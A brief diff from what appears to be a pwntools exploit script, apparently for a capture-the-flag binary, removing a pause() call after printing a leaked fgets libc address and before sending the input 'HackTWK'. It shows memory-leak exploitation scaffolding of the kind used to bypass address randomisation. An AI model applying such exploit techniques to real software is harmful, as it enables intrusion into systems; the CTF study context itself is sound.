@@ -53,7 +53,6 @@ fgets_leak = u64(leaks[0].ljust(8, b'\x00'))
 
 print(f"Leaked fgets: {hex(fgets_leak)}")
 
-pause()
 p.sendline(b"HackTWK")
 output = p.recvuntil(b": ")
 print(output)
